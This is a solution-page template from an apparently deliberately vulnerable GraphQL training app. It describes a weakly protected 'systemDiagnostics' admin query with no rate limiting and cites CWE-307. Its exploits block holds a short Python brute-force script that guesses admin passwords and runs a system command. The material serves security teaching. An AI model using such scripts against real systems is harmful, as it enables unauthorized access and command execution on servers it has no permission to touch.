{% extends 'partials/solutions/solution_base.html' %}
<!-- Start -->
{% block title %}Miscellaneous :: GraphQL Query Weak Password Protection{% endblock %}

{% block body %}
  <p>
    The query <code>systemDiagnostics</code> is an administrative functionality that allows running a subset of system
    commands on the server. The query is governed by a username and password before processing the
    command.
  </p>
  <p>
    The password is weak, and the server has no rate limiting protections. This allows attackers to easily conduct brute
    force attacks against the server.
  </p>
{% endblock %}

{% block resources %}
  <li>
    <a href="https://cwe.mitre.org/data/definitions/307.html" target="_blank">
      <i class="fa fa-newspaper"></i> CWE-307 - Improper Restriction of Excessive Authentication Attempts
    </a>
  </li>
{% endblock %}

{% block exploits %}
  <pre class="bash">
    # Brute Force attack with a list of passwords:
    passwordlist = ['admin123', 'pass123', 'adminadmin', '123']

    for password in passwordlist:
      resp = requests.post('http://host/graphql',
      json = {
        "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
        "variables":None
      })

      if not 'errors' in resp.text:
        print('Password is', password)
  </pre>
{% endblock %}
<!-- End -->
